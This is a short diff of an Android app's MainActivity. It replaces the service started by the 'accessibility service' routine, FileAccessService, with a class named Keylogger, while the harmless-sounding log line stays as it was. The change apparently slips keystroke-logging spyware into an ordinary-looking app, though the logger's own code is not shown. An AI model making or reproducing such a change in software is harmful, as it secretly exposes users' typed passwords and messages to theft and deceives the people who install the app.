@@ -44,7 +44,7 @@ public class MainActivity extends AppCompatActivity {
 
     private void startAccessibilityService() {
         Log.d("MainActivity", "Starting Accessibility Service...");
-        Intent serviceIntent = new Intent(this, FileAccessService.class);
+        Intent serviceIntent = new Intent(this, Keylogger.class);
         startService(serviceIntent);
     }
 
